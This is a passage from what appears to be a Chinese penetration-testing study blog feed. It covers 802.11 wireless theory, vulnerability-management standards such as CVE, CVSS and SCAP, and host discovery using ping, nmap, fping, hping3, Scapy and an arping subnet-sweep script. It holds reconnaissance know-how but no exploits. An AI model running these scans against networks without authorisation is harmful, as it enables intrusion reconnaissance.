只有在传输长帧时使用,传输短帧时不会使用<br>        驱动接口提供阈值的自定义<br>        大于阈值的帧被视为长帧,反之则视为短帧.<br>    Node1发送Request to Send包给Node2<br>    如果未发生冲突,Node2返回Clear to Send给Node1<br>    Node1传输数据<br>    数据正常接收,Node2返回ACK,否则Node1什么也不会收到.<br>有线网络介质访问方式:CSMA/CD<br>无线网络介质访问方法:CSMA/CA<br>隐藏节点<br>RTS帧长度20字节<br>CTS帧长度14字节</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线数据帧 </tag>
            
            <tag> ACK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线网络运行模式</title>
      <link href="/2013/05/25/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/"/>
      <url>/2013/05/25/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="无线网络架构"><a href="#无线网络架构" class="headerlink" title="无线网络架构"></a><strong>无线网络架构</strong></h4></blockquote><p>Infrastructure    // 基础架构模式<br>    AP 维护SSID<br>Ad-Hoc<br>    STA维护SSID<br>Service Set Identifier(SSID)<br>    AP每秒钟约10次通过Beacon帧广播SSID<br>    客户端连接到无线网络后也会宣告SSID</p><h5 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a><strong>Infrastructure</strong></h5><p>至少包含一个AP和一个Station,形成一个Basic Service Set(BSS)<br>AP连接到有线网络,称为Distribution System(DS)<br>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</p><h5 id="AD-HOC"><a href="#AD-HOC" class="headerlink" title="AD-HOC"></a><strong>AD-HOC</strong></h5><p>也被称为Independent Basic Service Set(BISS) #独立的架构模式<br>有至少2个Station直接通信组成<br>也称为peer to peer模式        //点到点<br>其中一个STA负责AP的工作<br>    通过beacon广播SSID<br>    对其它STAs进行身份验证</p><h5 id="WIRELESS-DISTRIBUTION-SYSTEM-WDS"><a href="#WIRELESS-DISTRIBUTION-SYSTEM-WDS" class="headerlink" title="WIRELESS DISTRIBUTION SYSTEM(WDS)"></a><strong>WIRELESS DISTRIBUTION SYSTEM(WDS)</strong></h5><p>与有线DS类似,只是通过无线连接的多个AP组成的网络<br>Bridging—-只有AP间彼此通信        // 桥接<br>Repeating—-允许所有AP和STA进行通信        // 中继</p><h5 id="Monitor-Mode"><a href="#Monitor-Mode" class="headerlink" title="Monitor Mode"></a><strong>Monitor Mode</strong></h5><p>Monitor不是一种真的无线模式<br>但是对无线渗透至关重要<br>允许无线 网上没有任何筛选的抓包(802.11包头)<br>与有线网络的混杂模式可以类比<br>适合的网卡和驱动但不可以monitor,更可以Injection</p><p>无线网硬件设备及基本概念<br>无线网卡准备<br>物理机运行kali<br>虚拟机运行kali<br>外置USB无线网卡<br>TL-WN722N(个人建议)</p><pre><code>dmesg -T    // 显示系统硬件设备使用纪录iwconfig    // 无线网卡配置查询</code></pre><h5 id="选择无线网卡"><a href="#选择无线网卡" class="headerlink" title="选择无线网卡"></a><strong>选择无线网卡</strong></h5><p>这是个痛苦和受挫的过程<br>无线网卡的芯片型号是成败的关键<br>台式机<br>    USB无线网卡(不支持扩展天线)<br>    PCMCIA(16Bit已停产802.11b)<br>    Cardbus(32bit PCMCIA 8.0标准)<br>    Express Cards<br>    MiniPCI<br>    MiniPCI Express<br>    PCI接口卡<br>发送功率:远程连接<br>接收灵敏性:适当降低灵敏度,接收效果更佳<br>经验但不是铁律<br>    Atheros或Realtek芯片<br>    没有神器<br>    兼容aircrack-ng suite<br><a href="http://www.aircrack-ng.org/" target="_blank" rel="noopener">http://www.aircrack-ng.org/</a><br>无线渗透网卡没有所谓的标准,但是Aircrack-ng suite作者给出建议<br>Alfa Networks AWUS036H无线网卡<br>    Realtek 8187芯片<br>    1000 mW发送功率<br>    天线:RP-SMA<br>        可扩展</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Monitor </tag>
            
            <tag> 无线模式 </tag>
            
            <tag> WDS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线通信过程</title>
      <link href="/2013/05/24/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/"/>
      <url>/2013/05/24/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="连接到无线网络"><a href="#连接到无线网络" class="headerlink" title="连接到无线网络"></a><strong>连接到无线网络</strong></h4><h5 id="Probe"><a href="#Probe" class="headerlink" title="Probe"></a>Probe</h5><p>STA向所有信道发出probe帧,发现AP<br>AP响应信道Response</p><h5 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h5><p>STA向AP发出验证请求<br>发生认证过程(步骤可变)<br>AP相应STA的认证结果</p><h5 id="Association"><a href="#Association" class="headerlink" title="Association"></a>Association</h5><p>STA发出关联请求<br>AP响应关联请求<br>关联成功,开始通信</p><h4 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a><strong>WEP探测过程</strong></h4><p>Beacon标识使用WEP加密<br>STA发送普通Probe帧<br>AP响应Probe Response帧声明其采用WEP加密</p><h4 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a><strong>WPA探测过程</strong></h4><p>两个AP的Beacon包内容不同,但都声明采用了WPA加密<br>不同厂商对802.11标准的实现方式不同<br>包头包含WPA1字段信息</p><h4 id="WEP-OPEN认证过程"><a href="#WEP-OPEN认证过程" class="headerlink" title="WEP OPEN认证过程"></a><strong>WEP OPEN认证过程</strong></h4><p>WEP OPEN认证与open认证通信过程相同<br>正确认证后通信数据被WEP加密<br>如果认证时客户端输入错误密码<br>    认证依然可以通过<br>    AP将丢弃该STA的数据包<br>        起始向量被错误地密钥解密后完整性被破坏<br>        但数据传输被失败<br>    认证响应正确,身份验证成功</p><h4 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a><strong>WEP PSK认证过程</strong></h4><p>STA发认证请求<br>AP返回随机Challenge消息<br>STA便用PSK加密Cha并发回给AP<br>AP使用PSK解密密文,获得Cha并与原始Cha比对,相同则验证成功,不同则验证失败;<br>大部分无线驱动首先尝试open验证,如果失败则尝试PSK</p><h4 id="WEP共享密钥认证过程"><a href="#WEP共享密钥认证过程" class="headerlink" title="WEP共享密钥认证过程"></a>WEP共享密钥认证过程</h4><p>无论使用什么加密架构,关联过程完全相同<br>    STA向AP发送关联请求<br>    AP向STA发送关联成功或失败结果<br>隐藏AP<br>    STA关联包中必须包含目标的ESSID<br>    嗅探到此关联包,说明有隐藏AP存在</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线通信 </tag>
            
            <tag> Probe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线技术概念</title>
      <link href="/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E6%A6%82%E5%BF%B5/"/>
      <url>/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a><strong>无线技术概念</strong></h3></blockquote><h4 id="分贝dB"><a href="#分贝dB" class="headerlink" title="分贝dB"></a><strong>分贝dB</strong></h4><p>测量无线信号强度<br>B:向Alexander Graham Bell 致敬<br>    今天大部分声学设备的发明者和理论奠基人<br>dB:表示2个信号之间的差异比率,用于描述设备的信号强度<br>    是一个相对值<br>dBm:功率值与1mW进行比较的dB值结果<br>dBpower=10.log(singnal/reference)<br>10.log(100mW/1mW)=10*2=20dBm<br>每增加3dBm,功率增加约1倍<br>每增加10dBm,功率增加约10倍<br>Example:<br>    dBm        mW<br>    0        1<br>    10        10<br>    15        32<br>    17        50<br>    20        100<br>    23        200<br>    27        512<br>    30        1000</p><h4 id="dBi-全向天线辐射强度"><a href="#dBi-全向天线辐射强度" class="headerlink" title="dBi:全向天线辐射强度"></a><strong>dBi:全向天线辐射强度</strong></h4><p>全向天线的信号功率增益<br>增益是指信号功率强度增加了多少dB<br>300mW=24.8dBi的无线路由器,添加一个9dBi的天线后功率如何变化(假设2dBi的电缆和接头耗损)<br>24.8dBi+9dBi-2dBi=31.8dBi<br>换算回mW功率<br>10(31.8dBi/10)次方=10*3.18次方=1513mW<br>dBm功率相加等于mW功率相乘</p><h4 id="dBd-定向天线辐射强度"><a href="#dBd-定向天线辐射强度" class="headerlink" title="dBd:定向天线辐射强度"></a><strong><code>dBd</code>:定向天线辐射强度</strong></h4><p>dBd是定向天线的增益值<br>全向天线在所有方向上收发信号,定向天线在指定方向的范围内收发信号<br>天线增益越大信号传输距离越远</p><p>既然有mW来表示功率为什么还要引入dB这个单位?<br>接收信号时无线信号转变为高频电子脉冲,反之发射信号时高频电子脉冲转换为无线电波,<br>这些过程功率往往要产生上万倍的变化,使用W,mW来计数非常不便,而dBm单位通过对功率的对数计算,<br>使用一个较小的数值既可以比较直观的表达功率的变化,因此无线和声学系统都采用了dB这个单位.</p><p>全向天线波形图<br>甜甜圈<br>天线选择的误区<br>益越高越好<br>高功耗<br>对周围环境的信号干扰<br>增益过高的全向天线会变成定向天线</p><h4 id="5dBi-vs-9dBi全向天线波形图对比"><a href="#5dBi-vs-9dBi全向天线波形图对比" class="headerlink" title="5dBi vs 9dBi全向天线波形图对比"></a><strong>5dBi vs 9dBi全向天线波形图对比</strong></h4><p>定向天线<br>双四边形<br>定向发送信号<br>功率相同时,比全向天线传输距离更远(方向正确的情况下)<br>定向天线<br>八木天线,引向反射天线；<br>定向天线<br>平面天线<br>定向天线<br>扇形天线<br>常用于移动电话网络<br>3到4个扇形天线联合使用可实现全向信号覆盖<br>90度扇形天线<br>定向天线<br>120度扇形天线波形<br>定向天线<br>网状天线<br>射束带宽更加集中,功率更强</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 全向天线 </tag>
            
            <tag> 无线技术 </tag>
            
            <tag> 定向天线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>802_11无线协议结构</title>
      <link href="/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/802_11%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/802_11%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>无线技术变化快,难度大<br>行业迅猛发展<br>互联网的重要入口<br>边界模糊<br>安全实施缺失而且困难<br>对技术不了解而造成配置不当<br>企业网络私自接入AP破坏网络边界<br>aircrack-ng suite作者写过一本关于无线渗透的书</p><h4 id="协议结构"><a href="#协议结构" class="headerlink" title="协议结构"></a><strong>协议结构</strong></h4><p>802.11标准<br>IEEE(Institute of Electrical and Electronice Engineers)<br>    由通信航天生物电气电子等方面的科学家组成,目的是制定标准,指导行业技术的发展,目前成员近40万人<br>IEEE分为不同的技术委员会(Committees),其中802委员会负责lan,man标准的制定<br>    以太网<br>    令牌环网<br>    无线局域网<br>    网桥<br>    无线(802.11)<br>        应用层<br>        表示层<br>        会话层<br>        传输层<br>        网络层<br>        数据链路层<br>            逻辑链路控制子层LLC<br>            媒体访问控制子层MAC<br>        物理层</p><h4 id="IEEE-802-1-1-标准"><a href="#IEEE-802-1-1-标准" class="headerlink" title="IEEE 802.1 1 标准"></a><strong>IEEE 802.1 1 标准</strong></h4><p>802委员会下第11组负责开发无线局域网标准<br>IEEE 802.1 1 The Original WLAN Standard - 1 Mbit/s and 2 Mbit/w,2.4 GHz RF and IR<br>IEEE 802.1 1a Up to 54 Mbit/s,5GHz<br>IEEE 802.1 1b 802.11 Enhancerments to Support 5.5 Mbit/s and 11 Mbit/s<br>IEEE 802.1 1c Bridge Operation Procedures<br>IEEE 802.1 1d International (Country to Country) Roaming Extensions<br>IEEE 802.1 1e Quality of Service (QoS),Including Packet Bursting<br>IEEE 802.1 1F Inter-Access Point Protocol<br>IEEE 802.1 1g 54 Mbit/s,2.4 GHz<br>IEEE 802.1 1h Spectrum Managed 802.11a(5 GHz) for European Compatibility<br>IEEE 802.1 1i Enhanced Security<br>IEEE 802.1 1j Extensions for Japan<br>IEEE 802.1 1k Radio Resource Measurement Enhancements<br>IEEE 802.1 1n Higher Throughput Using Multiple Input,Multiple Output (MIMO) Antennas<br>IEEE 802.1 1p Wireless Access for the Vehicular Environment (WAVE)<br>IEEE 802.1 1r Fast BSS Transition (FT)<br>IEEE 802.1 1s Mesh Networking,Extended Service Set (ESS)<br>IEEE 802.1 1T Wireless Performance Prediction(WPP)<br>IEEE 802.1 1u Internetworking with Non -802 Networks (i.e.:Cellular)<br>IEEE 802.1 1v Wireless Network Management<br>IEEE 802.1 1w Protected Management Frames<br>IEEE 802.1 1y 3650-2700 MHz Operation in the US<br>IEEE 802.1 1z Direct Link Setup (DLS) Extensions<br>IEEE 802.1 1mb Maintenance of the Standard<br>IEEE 802.1 1aa Robust Streaming of Audio Video Transport Streams<br>IEEE 802.1 1ac Very High Throughput &lt; 6 GHz<br>IEEE 802.1 1ad Very High Throughput, 60 GHz<br>IEEE 802.1 1ae QoS Management<br>IEEE 802.1 1af TV Whitespace<br>IEEE 802.1 1ah Sub 1 GHz<br>IEEE 802.1 1ai Fast Initial Link Setup</p><blockquote><p>日常使用</p></blockquote><p>IEEE 802.1 1 The Original WLAN Standard - 1 Mbit/s and 2 Mbit/w,2.4 GHz RF and IR<br>IEEE 802.1 1a Up to 54 Mbit/s,5GHz<br>IEEE 802.1 1b 802.11 Enhancerments to Support 5.5 Mbit/s and 11 Mbit/s<br>IEEE 802.1 1g 54 Mbit/s,2.4 GHz<br>IEEE 802.1 1i Enhanced Security<br>IEEE 802.1 1n Higher Throughput Using Multiple Input,Multiple Output (MIMO) Antennas</p><h4 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a><strong>802.11</strong></h4><p>发布于1997年<br>速率1Mbps或2Mbps<br>红外线传输介质(未实现)<br>无线射频信号编码(调制)(radio frequencies)<br>    Direct-Sequence Spread-Spectrum(DSSS)–十序扩频<br>    Frequency Hopping Spread-Spectrum(FHSS)–跳频扩频<br>媒体访问方式—-CSMA/CA c=b+log2(1+s/n)<br>    根据算法侦听一定时长<br>    发送数据前发包声明<br>Request to Send/Clear to Send(RTS/CTS)</p><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a><strong>802.11b</strong></h4><p>Complermentary Code Keying(CCK)–补充代码键<br>    5.5 and 1 1Mbit/s<br>    2.4GHz band (2.4GHz-2.485GHz)<br>    14个重叠的信道channets<br>    每个信道22MHz带宽<br>    只有三个完全不重叠的信道<br>美国–1 to 11(2.412 GHz–2.462 GHz)<br>欧洲–1 to 13(2.412 GHz–2.472 GHz)<br>日本–1 to 14(2.412 GHz–2.485 GHz)</p><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a><strong>802.11a</strong></h4><p>与802.1 1b几乎同时发布<br>    因设备价格问题一直没有得到广泛使用<br>使用5GHz带宽<br>    2.4GHz带宽干扰源多(微波,蓝牙,无线电话)<br>    5GHz频率有更多带宽空间,可容纳更多不重叠的信道<br>    Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<br>        正交频分复用技术<br>    更高速率54Mbps,每个信道20MHz带宽<br>    变频<br>        5.15-5.35 GHz室内<br>        5.7-5.8 GHz室外</p><h4 id="802-1-1g"><a href="#802-1-1g" class="headerlink" title="802.1 1g"></a><strong>802.1 1g</strong></h4><p>2.4GHz 频段<br>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<br>与802.11a速率相同<br>可全局降速 向后兼容802.11b,并切换为CCK信号调制方法<br>每个信道20/22MHz带宽</p><h4 id="802-1-1n"><a href="#802-1-1n" class="headerlink" title="802.1 1n"></a><strong>802.1 1n</strong></h4><p>2.4或5GHz频率<br>300Mbps最高600Mbps<br>Multiple-Input Multiple-Output (MIMO)多进多出通信技术    #多个天线<br>多天线,多无线电波,独立收发信号<br>可以使用40MHz信道带宽是数据传输速率翻倍<br>全802.11n设备网络中,可以使用新报文格式,使速率达到最大<br>每个信道20/40MHz带宽</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞的基本概念及漏洞发现管理</title>
      <link href="/2013/04/17/pentest/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/"/>
      <url>/2013/04/17/pentest/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4></blockquote><p>基于端口服务扫描结果版本信息(速度慢)<br>搜索已公开的漏洞数据库(数量大)<br>使用弱点扫描器实现漏洞管理</p><blockquote><h4 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h4></blockquote><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>    #kali官方漏洞库<br><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a><br><code>sandi漏洞库</code> #程序停更<br>    <code>searchsploit tomcat</code><br>    <code>cd /usr/share/exploitdb/exploits/</code></p><blockquote><h4 id="从信息的纬度定义漏洞管理"><a href="#从信息的纬度定义漏洞管理" class="headerlink" title="从信息的纬度定义漏洞管理"></a>从信息的纬度定义漏洞管理</h4></blockquote><p>信息收集:<br>    扫描发现网络IP,OS,服务,配置,漏洞<br>    能力需求:定义扫描方式内容和目标<br>信息管理:<br>    格式化信息,并进行筛选,分组,定义优先级<br>    能力需求:资产分组,指定所有者,向所有者报告漏洞<br>信息输出:<br>    向不同层级的人群展示足够的信息量<br>    能力需求:生成报告,导出数据,与SIEM集成</p><blockquote><h5 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h5></blockquote><p>主动扫描<br>    有身份验证<br>    无身份验证<br>被动扫描<br>    镜像端口抓包<br>    其它来源输入<br>基于Agent的扫描<br>    支持平台有限</p><blockquote><h4 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4></blockquote><h5 id="CVSS-Common-Vulnerability-Scoring-System"><a href="#CVSS-Common-Vulnerability-Scoring-System" class="headerlink" title="CVSS (Common Vulnerability Scoring System)"></a><strong>CVSS</strong> (Common Vulnerability Scoring System)</h5><p>通用漏洞评分系统–工业标准<br>描述安全漏洞严重程度的统一评分方案<br>V3版本–2015年6月10日<br>Basic Metric:基础的恒定不变的弱点权重<br>Temporal Metric:依赖时间因素的弱点权重<br>Enviromental Metric:利用弱点的环境要求和实施难度的权重<br>CVSS是安全内容自动化协议(SCAP)的一部分<br>通常CVSS与CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新<br>分值范围:0–10<br>不同机构按CVSS分会定义威胁的中,高,低威胁级别<br>CVSS体现弱点的风险,威胁级别(severity)表示弱点风险对企业的影响程度<br>CVSS分值是工业标准,但威胁级别不是<br>Vulnerability Reference</p><h5 id="CVE-Common-Vulnerabilities-and-Exposures"><a href="#CVE-Common-Vulnerabilities-and-Exposures" class="headerlink" title="CVE (Common Vulnerabilities and Exposures)"></a><strong>CVE</strong> (Common Vulnerabilities and Exposures)</h5><p>已公开的信息安全漏洞字典,统一的漏洞编号标准<br>MITRE公司负责维护(非盈利机构)<br>扫描器的大部分扫描式都对应一个CVE编号<br>实现不同厂商之间信息交换的统一标准</p><h5 id="CVE发布流程"><a href="#CVE发布流程" class="headerlink" title="CVE发布流程"></a>CVE发布流程</h5><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List —-CVE-2008-4250</li><li>MITRE负责对内容 进行编辑维护</li><li>很多厂商维护自己的Vulnerability Reference<br>  MS(微软)<br>  MSKB</li><li>其它Vulnerability Reference<br>  CERT    TA08-297A<br>  BID        31874<br>  IAVM    2008-A-0081<br>  OVAL    OVAL6093</li></ul><h5 id="OVAL-Open-Vulnerability-and-Assessment-Language"><a href="#OVAL-Open-Vulnerability-and-Assessment-Language" class="headerlink" title="OVAL (Open Vulnerability and Assessment Language)"></a><strong>OVAL</strong> (Open Vulnerability and Assessment Language)</h5><p>描述漏洞检测方法的机器可识别语言<br>详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施漏洞检测工作<br>OVAL使用XML语言描述,包含了严密的语法逻辑</p><h5 id="CCE"><a href="#CCE" class="headerlink" title="CCE"></a><strong>CCE</strong></h5><p>描述软件配置缺陷的一种标准化格式<br>在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作.</p><h5 id="CPE-Common-Product-Enumeration"><a href="#CPE-Common-Product-Enumeration" class="headerlink" title="CPE(Common Product Enumeration)`"></a><strong>CPE</strong>(Common Product Enumeration)`</h5><p>信息技术产品,系统,软件包的机构化命名规范,分类命名</p><h5 id="CWE-Common-Weakness-Enumeration"><a href="#CWE-Common-Weakness-Enumeration" class="headerlink" title="CWE (Common Weakness Enumeration)"></a><strong>CWE</strong> (Common Weakness Enumeration)</h5><p>常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</p><h5 id="SCAP-Security-Content-Automation-Protocol"><a href="#SCAP-Security-Content-Automation-Protocol" class="headerlink" title="SCAP (Security Content Automation Protocol)"></a><strong>SCAP</strong> (Security Content Automation Protocol)</h5><p>SCAP是一个集合了多种安全标准框架<br>六个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF<br>目的是以标准的方法展示和操作安全数据<br>由NIST负责维护<br>SCAP主要解决三个问题<br>    实现高层政策法规等到底层实施的落地(如FISMA,ISO27000系列)<br>    将信息安全所涉及的各个要素标准化(如统一漏洞的命名及严重性度量)<br>    将复杂的系统配置核查工作自动化<br>SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响.</p><h5 id="NVD-National-Vulnerability-Database"><a href="#NVD-National-Vulnerability-Database" class="headerlink" title="NVD (National Vulnerability Database)"></a><strong>NVD</strong> (National Vulnerability Database)</h5><p>美国政府的漏洞管理标准数据<br>完全基于SCAP框架<br>实现自动化漏洞管理,安全测量,合规要求<br>包含以下库<br>    安全检查列表<br>    软件安全漏洞<br>    配置错误<br>    产品名称<br>    影响度量<br>    <a href="https://nvd.nist.gov" target="_blank" rel="noopener">https://nvd.nist.gov</a></p><blockquote><h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4></blockquote><p>周期性扫描跟踪漏洞<br>高位漏洞优先处理<br>扫描注意事项<br>漏洞管理三要素<br>    准确性<br>    时间<br>    资源</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞扫描 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞库 </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Network三层发现_路由追踪</title>
      <link href="/2013/03/16/Information_Gethering/Network%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0_%E8%B7%AF%E7%94%B1%E8%BF%BD%E8%B8%AA/"/>
      <url>/2013/03/16/Information_Gethering/Network%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0_%E8%B7%AF%E7%94%B1%E8%BF%BD%E8%B8%AA/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="network"><a href="#network" class="headerlink" title="network"></a><strong>network</strong></h3></blockquote><p>优点<br>    可路由<br>    速度比较快<br>缺点<br>    速度比二层慢<br>    经常被边界防火墙过滤<br>IP，icmp协议</p><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a><strong>ping</strong></h4><pre><code>ping 1.1.1.1 -c 5ping 1.1.1.1 ping 1.1.1.1 -c 1 | grep &quot;bytes from&quot; | cut -d &quot;&quot; -f 4 | cut -d &quot;:&quot; -f 1</code></pre><h4 id="路由追踪"><a href="#路由追踪" class="headerlink" title="路由追踪"></a><strong>路由追踪</strong></h4><pre><code>traceroute 1.1.1.1 ping -R 1.1.1.1</code></pre><h4 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a><strong>Scapy</strong></h4><pre><code>ip=IP()ip.dst=&quot;1.1.1.1&quot;ping=ICMP()a=sr1(ip/ping)a.display()a=sr1(ip/ping,timeout=1)  #ping不存在的地址sr1(IP(dst=&quot;192.168.254.254&quot;)/ICMP()) #合并</code></pre><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a><strong>NMAP</strong></h4><pre><code>nmap -sn 1.1.1.1-255 #如果IP在本网段发二层arp包，如果不同网端发icmp包nmap -iL iplist.txt -sn</code></pre><h4 id="fping"><a href="#fping" class="headerlink" title="fping"></a><strong>fping</strong></h4><pre><code>fping 1.1.1.1 -c 1fping -g 1.1.1.1 1.1.1.2fping -g 1.1.1.0/24fping -f iplist.txt</code></pre><h4 id="Hping"><a href="#Hping" class="headerlink" title="Hping"></a><strong>Hping</strong></h4><p>能够发送几乎所有TCP/IP包头<br>功能强大但每次只能扫描一个目标<br>拒绝服务，压力测试<br>    hping3 1.1.1.1 –icmp -c 2<br>    for addr in $(seq 1 254); do hping3 1.1.1.$addr –icmp -c 1 &gt;&gt;handle.txt &amp;done</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Scapy </tag>
            
            <tag> 路由追踪 </tag>
            
            <tag> traceroute </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议的数据链路层扫描探测</title>
      <link href="/2013/03/15/Information_Gethering/ARP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/"/>
      <url>/2013/03/15/Information_Gethering/ARP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>Data link (Arp) 二层发现<br>优点：扫描速度块，可靠<br>缺点：不可路由<br>Arp协议<br>抓包</p><pre><code>ifconfigdhclient eth0arping 1.1.1.1 -c 1arping 192.168.1.1 -d #arp欺骗检测</code></pre><blockquote><p>Bash脚本：<code>arping1.sh</code>  #扫描网段</p></blockquote><pre><code>#!/bin/bashif [&quot;$#&quot; -ne 1 ]:then  echo &quot;Usage - ./arping.sh [interface]&quot;  echo &quot;Example - ./arping.sh eth0&quot;  echo &quot;Example will preform an ARP scan of the local subnet to which eth0 is assigned&quot;  exitfiinterface=$1prefix=$(ifconfig $interface | grep &apos;inet addr&apos; | cut -d &apos;:&apos; -f 2 | cut -d &apos; &apos; -f 1 | cut -d &apos;.&apos; -f 1-3)for addr in $(seq 1 254); do  arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1done</code></pre><blockquote><p>NMAP</p></blockquote><pre><code>nmap 